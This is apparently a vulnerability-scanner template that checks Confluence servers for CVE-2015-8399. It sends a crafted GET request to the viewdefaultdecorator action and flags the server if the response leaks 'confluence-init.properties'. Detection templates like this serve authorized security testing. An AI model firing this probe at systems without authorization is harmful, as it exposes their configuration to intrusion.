detail:
  author: whynot(https://github.com/notwhy)
  links:
  - https://www.anquanke.com/vul/id/1150798
expression: r0()
manual: true
name: poc-yaml-confluence-cve-2015-8399
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b"confluence-init.properties")
      && response.body.bcontains(b"View Default Decorator")
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /spaces/viewdefaultdecorator.action?decoratorName
transport: http
